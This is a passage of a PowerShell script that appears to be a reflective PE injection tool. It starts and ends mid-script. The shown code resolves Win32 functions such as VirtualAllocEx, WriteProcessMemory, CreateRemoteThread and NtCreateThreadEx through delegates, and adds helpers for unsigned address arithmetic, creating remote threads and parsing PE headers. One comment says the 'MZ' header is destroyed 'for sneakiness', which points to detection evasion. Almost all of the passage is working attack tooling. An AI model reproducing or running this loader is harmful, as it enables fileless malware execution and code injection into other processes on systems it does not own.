        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
        
        return $Win32Functions
    }
    #####################################

            
    #####################################
    ###########    HELPERS   ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
        [IntPtr]
        $EndAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr]::Zero
        if ($PsCmdlet.ParameterSetName -eq "Size")
        {
            [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        }
        else
        {
            $FinalEndAddress = $EndAddress
        }
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $PEInfo = New-Object System.Object
        
        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    #   PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
